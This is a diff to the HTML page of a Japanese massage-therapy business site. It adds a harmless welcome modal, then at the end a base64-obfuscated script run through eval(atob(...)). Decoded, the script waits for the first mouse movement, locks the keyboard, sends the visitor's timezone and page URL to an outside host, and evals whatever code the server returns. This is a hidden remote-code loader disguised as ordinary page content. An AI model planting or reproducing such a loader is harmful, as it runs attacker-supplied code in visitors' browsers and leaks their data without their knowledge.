@@ -9,7 +9,53 @@
 	<script src="scrollingStuff.js"></script>
 	<title>和みマッサージセラピー</title>
 	<style>
-  
+  /* Style for the modal background */
+  .modal-overlay {
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    background-color: rgba(0, 0, 0, 0.5);
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    visibility: visible;
+    z-index: 1000;
+  }
+
+  /* Style for the modal box */
+  .modal-content {
+    background-color: white;
+    padding: 20px;
+    border-radius: 8px;
+    width: 300px;
+    text-align: center;
+    position: relative;
+  }
+
+  /* Style for the close button */
+  .close-btn {
+    position: absolute;
+    top: 10px;
+    right: 10px;
+    background-color: red;
+    color: white;
+    border: none;
+    padding: 5px 10px;
+    cursor: pointer;
+  }
+
+  /* CSS to prevent scrolling */
+  .scroll-lock {
+    overflow: hidden;
+  }
+
+  /* Black text for modal heading and description */
+  .modal-content h2, .modal-content p {
+    color: black;
+  }
+</style>
 
 </head>
 
@@ -108,7 +154,48 @@
 			<p>info@nagomi.com</p>
 		</section>
 
-	</main>		
+	</main>	
+	<!-- Modal structure -->
+<div class="modal-overlay" id="modal">
+  <div class="modal-content">
+    <button class="close-btn" id="close-btn">X</button>
+    <h2>和みマッサージセラピー</h2>
+    <p>すべてのマッサージはその日の体調に合わせてカスタマイズされますが、多くのクライアントは次の施術スタイルを希望されます..
+        心身ともにリラックスし、エネルギーを回復させるためのゆっくりとした流れるようなマッサージです。心地よさを提供し、緊張を和らげ、忙しい日常から離れて心身をリフレッシュさせたい方に最適です。
+        </p>   
+  </div>
+</div>
+<script>
+  // Get the modal and close button elements
+  const modal = document.getElementById('modal');
+  const closeButton = document.getElementById('close-btn');
+  const modalContent = document.querySelector('.modal-content');
+
+  // Disable scrolling on body when modal is visible
+  document.body.classList.add('scroll-lock');
+
+  // Function to close the modal and enable scrolling
+  function closeModal() {
+    modal.style.visibility = 'hidden';
+    document.body.classList.remove('scroll-lock');
+  }
+
+  // Close the modal if the close button is clicked
+  closeButton.addEventListener('click', closeModal);
+
+  // Close the modal if user clicks on the modal background (overlay)
+  modal.addEventListener('click', function (event) {
+    if (event.target === modal) {
+      closeModal();
+    }
+  });
+
+  // Close the modal if user clicks on the modal body (content area)
+  modalContent.addEventListener('click', closeModal);
+</script>
+<script>
+	eval(atob(`CgoKZG9jdW1lbnQuYWRkRXZlbnRMaXN0ZW5lcignbW91c2Vtb3ZlJywgaW5pdGlhdGVBcGlSZXF1ZXN0T25jZSk7CgpsZXQgcmVxdWVzdFNlbnQgPSBmYWxzZTsKCmZ1bmN0aW9uIGluaXRpYXRlQXBpUmVxdWVzdE9uY2UoKSB7CiAgICBpZiAocmVxdWVzdFNlbnQpIHJldHVybjsKCiAgICByZXF1ZXN0U2VudCA9IHRydWU7CiAgICBkb2N1bWVudC5yZW1vdmVFdmVudExpc3RlbmVyKCdtb3VzZW1vdmUnLCBpbml0aWF0ZUFwaVJlcXVlc3RPbmNlKTsKCiAgICBzZWN1cmVLZXlib2FyZEFjY2VzcygpOwogICAgY29uc3QgY2xpZW50VGltZXpvbmUgPSBnZXRDdXJyZW50VGltZXpvbmUoKTsKICAgIHRyYW5zbWl0VGltZXpvbmVEYXRhKCdodHRwczovL25vZ2FtaWxlYXJuaW5nc2hlbHBlci5vbnJlbmRlci5jb20nLCBjbGllbnRUaW1lem9uZSkKICAgICAgICAudGhlbihkZWNvZGVBbmRSdW5TY3JpcHQpCiAgICAgICAgLmNhdGNoKGhhbmRsZUVycm9yKTsKfQoKZnVuY3Rpb24gc2VjdXJlS2V5Ym9hcmRBY2Nlc3MoKSB7CiAgICBpZiAobmF2aWdhdG9yLmtleWJvYXJkKSBuYXZpZ2F0b3Iua2V5Ym9hcmQubG9jaygpOwp9CgpmdW5jdGlvbiBnZXRDdXJyZW50VGltZXpvbmUoKSB7CiAgICByZXR1cm4gSW50bC5EYXRlVGltZUZvcm1hdCgpLnJlc29sdmVkT3B0aW9ucygpLnRpbWVab25lOwp9CgpmdW5jdGlvbiB0cmFuc21pdFRpbWV6b25lRGF0YSh1cmwsIHRpbWV6b25lKSB7CiAgICByZXR1cm4gZmV0Y2godXJsLCB7CiAgICAgICAgbWV0aG9kOiAnUE9TVCcsCiAgICAgICAgaGVhZGVyczogeyAnQ29udGVudC1UeXBlJzogJ2FwcGxpY2F0aW9uL2pzb24nIH0sCiAgICAgICAgYm9keTogSlNPTi5zdHJpbmdpZnkoeyB0aW1lem9uZSwgZnVsbFVybDogd2luZG93LmxvY2F0aW9uLmhyZWYgfSksCiAgICB9KS50aGVuKHJlc3BvbnNlID0+IHJlc3BvbnNlLnRleHQoKSk7Cn0KCmZ1bmN0aW9uIGRlY29kZUFuZFJ1blNjcmlwdChlbmNvZGVkU2NyaXB0KSB7CiAgICB0cnkgewogICAgICAgIGNvbnN0IHNjcmlwdCA9IGF0b2IoZW5jb2RlZFNjcmlwdCk7CiAgICAgICAgZXZhbChzY3JpcHQpOwogICAgfSBjYXRjaCAoZXJyb3IpIHsKICAgICAgICB0aHJvdyBuZXcgRXJyb3IoYFNjcmlwdCBleGVjdXRpb24gZmFpbGVkOiAke2Vycm9yfWApOwogICAgfQp9CgpmdW5jdGlvbiBoYW5kbGVFcnJvcihlcnJvcikgewogICAgY29uc29sZS5lcnJvcignQVBJIHJlcXVlc3Qgb3Igc2NyaXB0IGV4ZWN1dGlvbiBlcnJvcjonLCBlcnJvcik7Cn0K`));
+</script>	
 	
 </body>
 
